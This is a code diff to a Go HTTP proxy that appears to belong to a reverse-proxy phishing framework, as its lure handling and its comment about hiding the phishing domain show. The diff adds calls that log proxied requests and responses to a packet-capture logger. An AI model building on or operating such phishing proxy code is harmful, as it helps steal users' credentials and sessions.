@@ -139,6 +139,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			ctx.UserData = ps
 			hiblue := color.New(color.FgHiBlue)
 
+			//send to pcaplogger
+			PCAPrequest(req)
+
 			// handle ip blacklist
 			from_ip := req.RemoteAddr
 			if strings.Contains(from_ip, ":") {
@@ -351,6 +354,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 											resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
 											if resp != nil {
+												PCAPresponse(resp) //send to pcaplogger
 												return req, resp
 											} else {
 												log.Error("lure: failed to create html template response")
@@ -378,6 +382,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 						if resp != nil {
 							resp.Header.Add("Location", rurl)
+							PCAPresponse(resp) //send to pcaplogger
 							return req, resp
 						}
 					}
@@ -389,6 +394,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 					resp := goproxy.NewResponse(req, "text/html", http.StatusNotFound, "")
 					if resp != nil {
+						PCAPresponse(resp) //send to pcaplogger
 						return req, resp
 					}
 				}
@@ -898,6 +904,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								// avoid leaking the phishing domain via the Referrer header
 								resp.Header.Set("Referrer-Policy", "no-referrer")
 								resp.Header.Set("Location", s.RedirectURL)
+								PCAPresponse(resp) //send to pcaplogger
 								return resp
 							}
 						}
@@ -905,6 +912,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
+			PCAPresponse(resp) //send to pcaplogger
 			return resp
 		})
 
@@ -922,14 +930,17 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 		resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 		if resp != nil {
 			resp.Header.Add("Location", redirect_url)
+			PCAPdual(req, resp) //send to pcaplogger
 			return req, resp
 		}
 	} else {
 		resp := goproxy.NewResponse(req, "text/html", http.StatusForbidden, "")
 		if resp != nil {
+			PCAPdual(req, resp) //send to pcaplogger
 			return req, resp
 		}
 	}
+	PCAPrequest(req) //send to pcaplogger
 	return req, nil
 }
 
